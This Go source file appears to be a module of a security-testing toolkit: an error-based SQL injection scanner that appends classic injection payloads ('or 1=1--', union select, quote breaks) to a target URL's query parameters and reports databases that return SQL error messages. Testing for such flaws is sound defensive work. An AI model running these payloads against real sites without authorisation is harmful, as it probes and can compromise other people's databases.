package modules

import (
	"context"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
)

// SQLInjectionTestingResult holds the result of the SQLInjectionTesting module execution.
type SQLInjectionTestingResult struct {
	Target  string `json:"target"`
	Payload string `json:"payload"`
	Status  string `json:"status"`
	Detail  string `json:"detail,omitempty"`
}

// SQLInjectionTesting executes the sql_injection_testing security technique.
// Description: inject malicious SQL statements into user input fields to manipulate database queries
type SQLInjectionTesting struct {
	Target     string
	Cookies    string
	maxThreads int
	mu         sync.Mutex
	results    []SQLInjectionTestingResult
	client     *http.Client
}

// NewSQLInjectionTesting creates a new instance of SQLInjectionTesting.
func NewSQLInjectionTesting(target string) *SQLInjectionTesting {
	if !strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://") {
		target = "http://" + target
	}
	return &SQLInjectionTesting{
		Target:     target,
		maxThreads: 5,
		client: &http.Client{
			Timeout: 10 * time.Second,
		},
	}
}

// SetCookies sets the Cookie header value for the requests.
func (m *SQLInjectionTesting) SetCookies(cookies string) {
	m.Cookies = cookies
}

// SetThreads sets the number of concurrent execution threads.
func (m *SQLInjectionTesting) SetThreads(count int) {
	if count < 1 {
		count = 1
	}
	m.maxThreads = count
}

var sqlErrors = []string{
	"you have an error in your sql syntax",
	"warning: mysql",
	"unclosed quotation mark after the character string",
	"quoted string not properly terminated",
	"pg_query(): query failed: error:",
	"sqlite3.error:",
	"syntax error or access violation",
}

var sqlPayloads = []string{
	"'",
	"\"",
	"\\' \\\"",
	"';--",
	"\" or \"1\"=\"1",
	"or 1=1--",
	"' union select null,null--",
}

// Execute performs the module's core tasks concurrently.
func (m *SQLInjectionTesting) Execute(ctx context.Context) ([]SQLInjectionTestingResult, error) {
	m.results = make([]SQLInjectionTestingResult, 0)

	parsedURL, err := url.Parse(m.Target)
	if err != nil {
		return nil, err
	}

	// Jobs will just be the payloads to inject into the URL query parameters
	jobs := make(chan string, len(sqlPayloads))
	for _, p := range sqlPayloads {
		jobs <- p
	}
	close(jobs)

	var wg sync.WaitGroup

	for i := 0; i < m.maxThreads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for payload := range jobs {
				select {
				case <-ctx.Done():
					return
				default:
					m.testPayload(ctx, parsedURL, payload)
				}
			}
		}()
	}

	done := make(chan struct{})
	go func() {
		wg.Wait()
		close(done)
	}()

	select {
	case <-done:
		return m.results, nil
	case <-ctx.Done():
		<-done
		return m.results, ctx.Err()
	}
}

func (m *SQLInjectionTesting) testPayload(ctx context.Context, u *url.URL, payload string) {
	// Create a new URL with the payload appended to the query
	query := u.Query()
	
	// Inject payload into every existing query parameter
	// Or just append it if there are no parameters
	hasParams := len(query) > 0
	
	testURL := *u
	if hasParams {
		for key, vals := range query {
			for i, val := range vals {
				query[key][i] = val + payload
			}
		}
		testURL.RawQuery = query.Encode()
	} else {
		query.Add("id", payload)
		query.Add("q", payload)
		query.Add("search", payload)
		testURL.RawQuery = query.Encode()
	}

	req, err := http.NewRequestWithContext(ctx, "GET", testURL.String(), nil)
	if err != nil {
		return
	}

	if m.Cookies != "" {
		req.Header.Set("Cookie", m.Cookies)
	}

	resp, err := m.client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return
	}

	bodyStr := strings.ToLower(string(bodyBytes))

	// Check if body contains any known SQL errors
	for _, sqlErr := range sqlErrors {
		if strings.Contains(bodyStr, sqlErr) {
			m.mu.Lock()
			m.results = append(m.results, SQLInjectionTestingResult{
				Target:  m.Target,
				Payload: payload,
				Status:  "vulnerable",
				Detail:  "SQL syntax error detected: " + sqlErr,
			})
			m.mu.Unlock()
			return
		}
	}
}
